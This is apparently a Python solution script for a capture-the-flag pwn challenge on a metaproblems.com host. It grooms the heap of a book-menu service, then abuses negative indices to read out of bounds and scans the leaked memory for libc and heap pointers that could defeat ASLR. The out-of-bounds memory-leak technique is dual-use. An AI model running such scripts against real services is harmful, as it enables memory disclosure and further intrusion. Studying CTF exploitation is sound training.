import socket
import time
import binascii
import struct

HOST = "host5.metaproblems.com"
PORT = 5020

# patterns to consider as possible pointers (little endian bytes)
# We'll check if value fits in these ranges
LIBC_RANGES = [
    (0x7F0000000000, 0x7FFFFFFFFFFF),  # typical linux x86_64 libc
]
HEAP_RANGES = [
    (0x555500000000, 0x7EFFFFFFFFFF),  # possible heap/stack ranges (heuristic)
]

BATCH_SIZE = 20
MAX_NEG = 80


def recv_all(s, timeout=1.0):
    s.settimeout(timeout)
    data = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
            if len(chunk) < 4096:
                break
    except socket.timeout:
        pass
    return data


def looks_like_ptr(val):
    for lo, hi in LIBC_RANGES + HEAP_RANGES:
        if lo <= val <= hi:
            return True
    return False


def scan_batch(start, end):
    # one connection for this batch
    try:
        s = socket.create_connection((HOST, PORT), timeout=8)
    except Exception as e:
        print("[!] connect failed", e)
        return {}
    print("[*] connected batch", start, "to", end)
    banner = recv_all(s, 1)
    # prepare heap: create 3 books, free one
    for ch, count in [(b"A", 1), (b"B", 1), (b"C", 4)]:
        s.sendall(b"1\n")
        time.sleep(0.05)
        _ = recv_all(s, 0.2)
        s.sendall(ch + b"\n")
        time.sleep(0.05)
        _ = recv_all(s, 0.2)
        s.sendall(str(count).encode() + b"\n")
        time.sleep(0.05)
        _ = recv_all(s, 0.2)
    # free book 0
    s.sendall(b"4\n")
    time.sleep(0.05)
    _ = recv_all(s, 0.2)
    s.sendall(b"0\n")
    time.sleep(0.05)
    _ = recv_all(s, 0.2)

    findings = {}
    for idx in range(start, end - 1, -1):
        try:
            s.sendall(b"3\n")
            time.sleep(0.02)
            _ = recv_all(s, 0.1)
            s.sendall(str(idx).encode() + b"\n")
            time.sleep(0.12)
            data = recv_all(s, 0.4)
        except Exception as e:
            print("[!] exception during read", e)
            break
        if not data or b"Invalid book" in data:
            continue
        # look for candidate 8-byte aligned values in data
        found = []
        for off in range(0, max(0, len(data) - 8), 8):
            chunk = data[off : off + 8]
            val = struct.unpack("<Q", chunk)[0]
            if looks_like_ptr(val):
                found.append((off, val))
        if found:
            findings[idx] = {
                "len": len(data),
                "hex": binascii.hexlify(data).decode(),
                "candidates": found,
            }
            print(f"[+] idx {idx} candidates:", found)
    s.close()
    return findings


def run_scan():
    all_findings = {}
    start = -1
    while start >= -MAX_NEG:
        end = max(start - BATCH_SIZE + 1, -MAX_NEG)
        f = scan_batch(start, end)
        all_findings.update(f)
        start = end - 1
        time.sleep(0.2)
    return all_findings


if __name__ == "__main__":
    findings = run_scan()
    print("=== SUMMARY ===")
    for k, v in findings.items():
        print(k, v["candidates"])
    print("done")
